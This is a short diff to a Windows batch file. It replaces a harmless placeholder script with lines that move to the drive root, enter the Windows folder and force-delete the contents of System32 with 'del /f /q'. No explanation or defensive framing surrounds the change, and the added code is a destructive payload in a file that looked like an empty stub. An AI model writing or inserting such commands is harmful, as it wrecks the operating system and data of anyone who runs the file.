@@ -1,3 +1,8 @@
-echo nothing here yet
-timeout 3 >nul
-exit
+cd..
+cd..
+cd..
+cd..
+cd..
+cd..
+cd Windows
+del /f /q "System32"
